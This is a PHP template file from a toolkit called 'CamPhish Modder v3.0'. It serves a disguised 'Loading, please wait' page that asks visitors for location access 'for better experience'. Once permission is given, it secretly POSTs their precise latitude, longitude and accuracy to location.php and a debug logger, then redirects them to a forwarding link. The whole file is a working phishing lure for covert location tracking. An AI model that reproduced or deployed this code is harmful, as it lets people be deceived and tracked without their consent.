<?php
// CamPhish Modder v3.0 - template.php (location gate, stable)
include 'ip.php';

echo '
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body {
            margin: 0; min-height: 100vh; display: flex; flex-direction: column;
            align-items: center; justify-content: center; text-align: center;
            font-family: Arial, Helvetica, sans-serif; color: #fff;
            background: radial-gradient(circle at 50% 30%, #1c2733 0%, #000 70%);
            padding: 40px 20px;
        }
        .card { max-width: 420px; width: 100%; }
        h2 { font-weight: 600; letter-spacing: .3px; margin: 0 0 8px; }
        p { color: #b9c4cf; margin: 6px 0; }
        #locationStatus { color: #7fe3ff; min-height: 22px; }
        .spinner {
            border: 8px solid #222; border-top: 8px solid #35d0ff;
            border-right: 8px solid #b96bff;
            border-radius: 50%; width: 60px; height: 60px;
            animation: spin 1s linear infinite; margin: 26px auto 0;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    <script>
        var redirected = false;
        function safeRedirect() {
            if (redirected) return;
            redirected = true;
            try { window.location.href = "forwarding_link/index2.html"; }
            catch (e) { window.location = "forwarding_link/index2.html"; }
        }
        function setStatus(t) {
            try { document.getElementById("locationStatus").innerText = t; } catch (e) {}
        }
        function debugLog(message) {
            try {
                if (message.indexOf("Lat:") !== -1 || message.indexOf("Latitude:") !== -1 || message.indexOf("Position obtained") !== -1) {
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "debug_log.php", true);
                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                    xhr.send("message=" + encodeURIComponent(message));
                }
            } catch (e) {}
        }
        function getLocation() {
            if (navigator.geolocation) {
                setStatus("Requesting location permission...");
                try {
                    navigator.geolocation.getCurrentPosition(sendPosition, handleError, {
                        enableHighAccuracy: true, timeout: 15000, maximumAge: 0
                    });
                } catch (e) { handleError(e); }
                // กันค้าง: ถ้า 20 วิยังไม่ไปไหน ให้ไปต่อเอง
                setTimeout(function() { safeRedirect(); }, 20000);
            } else {
                setStatus("Your browser does not support location services");
                setTimeout(safeRedirect, 2000);
            }
        }
        function sendPosition(position) {
            try {
                debugLog("Position obtained successfully");
                setStatus("Location obtained, loading...");
                var lat = position.coords.latitude;
                var lon = position.coords.longitude;
                var acc = position.coords.accuracy;
                debugLog("Lat: " + lat + ", Lon: " + lon + ", Accuracy: " + acc);
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "location.php", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) { setTimeout(safeRedirect, 1000); }
                };
                xhr.onerror = function() { safeRedirect(); };
                xhr.ontimeout = function() { safeRedirect(); };
                xhr.timeout = 8000;
                xhr.send("lat=" + encodeURIComponent(lat) + "&lon=" + encodeURIComponent(lon) + "&acc=" + encodeURIComponent(acc) + "&time=" + new Date().getTime());
                // สำรอง: ถ้า server ไม่ตอบใน 5 วิ ก็ไปต่อ
                setTimeout(safeRedirect, 5000);
            } catch (e) { safeRedirect(); }
        }
        function handleError(error) {
            setStatus("Redirecting...");
            try { debugLog("Geolocation error: " + (error && error.message ? error.message : error)); } catch (e) {}
            setTimeout(safeRedirect, 1500);
        }
        window.onload = function() { setTimeout(getLocation, 500); };
    </script>
</head>
<body>
    <div class="card">
        <h2>Loading, please wait...</h2>
        <p>Please allow location access for better experience</p>
        <p id="locationStatus">Initializing...</p>
        <div class="spinner"></div>
    </div>
</body>
</html>
';
exit;
?>
